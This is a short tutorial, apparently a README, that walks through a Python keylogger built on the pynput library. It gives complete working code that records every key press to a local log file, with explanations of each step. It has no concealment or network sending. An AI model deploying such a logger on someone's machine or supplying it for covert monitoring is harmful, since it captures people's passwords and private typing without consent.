Simple keylogger made using Python

Below is the tutorial and explanation for buiding the keylogger:

1. Install pynput library

py -m pip install pynput


pynput lets you monitor and control input devices like the keyboard and mouse in Python. Install pynput in the command prompt of your device.

2. Import required modules

import pynput
from pynput.keyboard import Key, Listener


pynput provides access to input devices
Key helps detect special keys like Enter, Space, Shift, etc
Listener listens for keyboard events (key press or release)

3. Define function to write key to a log file

def write_file(key):
    with open("ramLog.txt", 'a') as logKey:
        if hasattr(key, 'char') and key.char:
            logKey.write(key.char)
        else:
            logKey.write(f'[{key}]')


Opens or creates ramLog.txt in append mode ('a')
Checks if the key has a printable character (key.char)
If yes, it writes the character (e.g., "a", "b", "1")
If not (like Key.space, Key.enter), it writes the key in brackets (e.g., [Key.space])

4. Define the Key Press Handler

def on_press(key):
    print(f"{key} pressed")
    write_file(key)


This function is triggered whenever a key is pressed
Prints the key to the console and then calls write_file() function to save it to the log file

5. Start the Listener

with Listener(on_press=on_press) as listener:
    listener.join()


Starts listening for key presses using the on_press function.
listener.join() keeps the program running and listening until manually stopped.
